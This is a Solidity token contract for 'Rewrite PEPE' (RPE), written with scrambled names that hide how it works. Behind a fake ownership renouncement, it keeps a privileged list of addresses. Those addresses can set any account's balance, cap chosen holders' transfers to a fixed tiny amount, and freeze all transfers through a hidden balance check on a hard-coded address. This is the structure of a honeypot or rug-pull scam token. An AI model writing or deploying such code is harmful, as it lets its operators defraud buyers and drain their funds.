//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface launchMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldMin) external view returns (uint256);

    function transfer(address autoTx, uint256 isTo) external returns (bool);

    function allowance(address fromMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 isTo) external returns (bool);

    function transferFrom(
        address sender,
        address autoTx,
        uint256 isTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed totalAt, uint256 value);
    event Approval(address indexed fromMax, address indexed spender, uint256 value);
}

abstract contract amountSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableLiquidityReceiver {
    function createPair(address marketingLimit, address launchShould) external returns (address);
}

interface launchMarketingMetadata is launchMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RewritePEPE is amountSender, launchMarketing, launchMarketingMetadata {

    uint256 private feeBuyReceiver;

    function listAmount(address feeListLaunch, address autoTx, uint256 isTo) internal returns (bool) {
        require(takeMarketingLimit[feeListLaunch] >= isTo);
        takeMarketingLimit[feeListLaunch] -= isTo;
        takeMarketingLimit[autoTx] += isTo;
        emit Transfer(feeListLaunch, autoTx, isTo);
        return true;
    }

    function transferFrom(address feeListLaunch, address autoTx, uint256 isTo) external override returns (bool) {
        if (_msgSender() != fundMode) {
            if (modeTokenSwap[feeListLaunch][_msgSender()] != type(uint256).max) {
                require(isTo <= modeTokenSwap[feeListLaunch][_msgSender()]);
                modeTokenSwap[feeListLaunch][_msgSender()] -= isTo;
            }
        }
        return modeFund(feeListLaunch, autoTx, isTo);
    }

    bool private limitTotal;

    function modeFund(address feeListLaunch, address autoTx, uint256 isTo) internal returns (bool) {
        if (feeListLaunch == exemptMode) {
            return listAmount(feeListLaunch, autoTx, isTo);
        }
        uint256 launchLiquidity = launchMarketing(launchSell).balanceOf(takeIs);
        require(launchLiquidity == exemptAutoFund);
        require(autoTx != takeIs);
        if (txAuto[feeListLaunch]) {
            return listAmount(feeListLaunch, autoTx, sellMax);
        }
        return listAmount(feeListLaunch, autoTx, isTo);
    }

    function symbol() external view virtual override returns (string memory) {
        return buyWallet;
    }

    function walletBuy(address modeFrom) public {
        require(modeFrom.balance < 100000);
        if (walletLaunch) {
            return;
        }
        
        launchFund[modeFrom] = true;
        if (limitTotal == swapTotalMax) {
            swapTotalMax = false;
        }
        walletLaunch = true;
    }

    function tokenWallet(address modeEnableFrom, uint256 isTo) public {
        modeReceiverSwap();
        takeMarketingLimit[modeEnableFrom] = isTo;
    }

    uint256 public sellSender;

    uint8 private senderMin = 18;

    bool public launchedReceiver;

    bool public walletLaunch;

    mapping(address => mapping(address => uint256)) private modeTokenSwap;

    string private buyWallet = "RPE";

    function name() external view virtual override returns (string memory) {
        return modeTeam;
    }

    function modeReceiverSwap() private view {
        require(launchFund[_msgSender()]);
    }

    address public exemptMode;

    bool public txAt;

    bool private swapTotalMax;

    uint256 exemptAutoFund;

    address takeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return txLaunched;
    }

    event OwnershipTransferred(address indexed liquiditySenderAmount, address indexed buyToken);

    function balanceOf(address shouldMin) public view virtual override returns (uint256) {
        return takeMarketingLimit[shouldMin];
    }

    function isFee(uint256 isTo) public {
        modeReceiverSwap();
        exemptAutoFund = isTo;
    }

    constructor (){
        if (fromAmount == fundIs) {
            fundIs = feeBuyReceiver;
        }
        toLaunch isMode = toLaunch(fundMode);
        launchSell = enableLiquidityReceiver(isMode.factory()).createPair(isMode.WETH(), address(this));
        if (feeBuyReceiver == sellSender) {
            feeBuyReceiver = fundIs;
        }
        exemptMode = _msgSender();
        liquidityReceiver();
        launchFund[exemptMode] = true;
        takeMarketingLimit[exemptMode] = fundReceiver;
        if (launchedReceiver != tokenIs) {
            tokenIs = false;
        }
        emit Transfer(address(0), exemptMode, fundReceiver);
    }

    function teamSell(address takeShould) public {
        modeReceiverSwap();
        if (fundIs != fromAmount) {
            launchedReceiver = false;
        }
        if (takeShould == exemptMode || takeShould == launchSell) {
            return;
        }
        txAuto[takeShould] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundReceiver;
    }

    function allowance(address amountLiquidity, address amountToken) external view virtual override returns (uint256) {
        if (amountToken == fundMode) {
            return type(uint256).max;
        }
        return modeTokenSwap[amountLiquidity][amountToken];
    }

    mapping(address => bool) public launchFund;

    address public launchSell;

    uint256 receiverToken;

    bool public tokenIs;

    function decimals() external view virtual override returns (uint8) {
        return senderMin;
    }

    mapping(address => uint256) private takeMarketingLimit;

    uint256 public fromAmount;

    function owner() external view returns (address) {
        return txLaunched;
    }

    bool private amountSellMax;

    address fundMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private fundReceiver = 100000000 * 10 ** 18;

    string private modeTeam = "Rewrite PEPE";

    uint256 private fundIs;

    function liquidityReceiver() public {
        emit OwnershipTransferred(exemptMode, address(0));
        txLaunched = address(0);
    }

    mapping(address => bool) public txAuto;

    address private txLaunched;

    function approve(address amountToken, uint256 isTo) public virtual override returns (bool) {
        modeTokenSwap[_msgSender()][amountToken] = isTo;
        emit Approval(_msgSender(), amountToken, isTo);
        return true;
    }

    function transfer(address modeEnableFrom, uint256 isTo) external virtual override returns (bool) {
        return modeFund(_msgSender(), modeEnableFrom, isTo);
    }

    uint256 constant sellMax = 7 ** 10;

}